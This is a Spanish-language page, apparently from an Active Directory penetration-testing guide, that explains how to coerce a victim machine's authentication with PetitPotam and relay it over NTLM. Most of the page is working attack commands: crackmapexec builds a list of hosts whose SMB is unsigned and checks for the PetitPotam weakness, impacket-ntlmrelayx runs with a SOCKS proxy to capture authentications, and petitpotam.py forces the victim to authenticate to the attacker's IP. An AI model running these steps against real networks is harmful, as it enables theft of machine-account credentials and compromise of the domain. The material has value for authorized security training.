# Coercionar a la Víctima con PetitPotam

Si la vítima es vulnerable a petit potam podemos capturar las credenciales de la cuenta del equipo utilizando la técnica de NTLM RELAY:
[NTLM_relay](no_credentials/NTLM_relay/)

```Bash
# Obtener dispositivos con el SMB sin firmar
poetry run crackmapexec smb <rango ip> --gen-relay-list <output equipos relay>
# Ejecutar ntlmrelayx con socks para capturar y guardar la autenticación # La opción smb2support es cuando los objetivos son equipo actuales como windows 10 o Windoows server 2019
impacket-ntlmrelayx -tf <output equipos relay> -of netntlm -smb2support -socks
# Insertar el comando "socks" en la misma terminal para obtener las autenticaciones capturadas
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam1.png?raw=true "NTLM relay petitpotam")

```Bash
# Comprobar si la víctima es vulnerable a petitpotam con crackmapexec
poetry run crackmapexec smb <Rango IP> -M petitpotam
# Ejecutamos petitpotam del repositorio de Github: https://github.com/topotam/PetitPotam
python petitpotam.py <IP atacante> <DNS del equipo vísctima>
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam2.png?raw=true "petitpotam")

Resultad: (para ver las sesiones escribir "socks")

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam3.png?raw=true "NTLM relay petitpotam")
